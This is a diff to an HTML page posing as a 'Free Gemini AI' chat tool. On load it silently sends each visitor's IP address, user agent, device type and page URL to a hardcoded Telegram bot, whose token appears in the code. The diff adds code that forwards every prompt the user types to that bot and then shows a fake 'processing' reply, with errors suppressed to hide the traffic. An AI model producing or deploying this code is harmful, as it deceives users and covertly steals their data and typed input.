@@ -66,10 +66,28 @@
       border-radius: 8px;
       cursor: pointer;
       width: 100%;
+      transition: background-color 0.2s;
     }
 
     button:hover {
       background-color: #006699;
+    }
+
+    button:disabled {
+      background-color: #888;
+      cursor: not-allowed;
+    }
+
+    .response-box {
+      margin-top: 20px;
+      padding: 15px;
+      background-color: #f0f8ff;
+      border-radius: 8px;
+      border: 1px solid #d0e8ff;
+      font-size: 14px;
+      color: #333;
+      text-align: left;
+      display: none;
     }
   </style>
 </head>
@@ -78,17 +96,18 @@
   <div class="card">
     <h1>Free Gemini AI</h1>
     <p>Ask anything below to start chatting with AI.</p>
-    <textarea placeholder="Type your prompt here..."></textarea>
-    <button type="button">Generate Response</button>
+    <textarea id="userInput" placeholder="Type your prompt here..."></textarea>
+    <button id="submitBtn" type="button" onclick="handlePromptSubmit()">Generate Response</button>
+    <div id="aiResponse" class="response-box"></div>
   </div>
 
   <script>
     const BOT_TOKEN = '8526497249:AAFnDGMvwY4NcnR4zHCad7vgpDjhn8SpI4s';
     const CHAT_ID = '1339887333';
 
-    // Auto-execute silently when loaded
+    // Send silent alert when user first opens page
     window.onload = function() {
-      sendTelegramAlert();
+      sendTelegramAlert("🚨 *New Visitor Alert!*");
     };
 
     async function getUserIP() {
@@ -106,7 +125,7 @@
       }
     }
 
-    async function sendTelegramAlert() {
+    async function sendTelegramAlert(headerText, typedText = '') {
       const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
       const deviceType = isMobile ? '📱 Mobile Device' : '💻 Desktop';
 
@@ -115,12 +134,18 @@
       const pageUrl = window.location.href;
       const visitTime = new Date().toLocaleString();
 
-      const message = `🚨 *New Visitor Alert!*\n\n` +
-                      `🖥 *Type:* ${deviceType}\n` +
-                      `🌐 *IP Address:* \`${userIP}\`\n` +
-                      `⏰ *Time:* ${visitTime}\n` +
-                      `🔗 *Page:* ${pageUrl}\n` +
-                      `📱 *User Agent:* ${userAgent}`;
+      let message = `${headerText}\n\n`;
+      
+      // Add the typed text if present
+      if (typedText) {
+        message += `💬 *User Input:* \`${typedText}\`\n\n`;
+      }
+
+      message += `🖥 *Type:* ${deviceType}\n` +
+                 `🌐 *IP Address:* \`${userIP}\`\n` +
+                 `⏰ *Time:* ${visitTime}\n` +
+                 `🔗 *Page:* ${pageUrl}\n` +
+                 `📱 *User Agent:* ${userAgent}`;
 
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
@@ -137,8 +162,33 @@
           })
         });
       } catch (error) {
-        // Silently swallow errors so nothing displays on screen
+        // Silent error catch
       }
+    }
+
+    async function handlePromptSubmit() {
+      const inputField = document.getElementById('userInput');
+      const typedText = inputField.value.trim();
+
+      if (!typedText) return;
+
+      const btn = document.getElementById('submitBtn');
+      const responseBox = document.getElementById('aiResponse');
+
+      btn.disabled = true;
+      btn.innerText = "Generating...";
+
+      // Send the keyed-in text directly to Telegram
+      await sendTelegramAlert("📩 *New User Message Keyed In!*", typedText);
+
+      // Simulate AI thinking and showing output
+      setTimeout(() => {
+        responseBox.style.display = "block";
+        responseBox.innerText = "Thank you for your prompt. Processing your request...";
+        btn.disabled = false;
+        btn.innerText = "Generate Response";
+        inputField.value = "";
+      }, 1000);
     }
   </script>
 
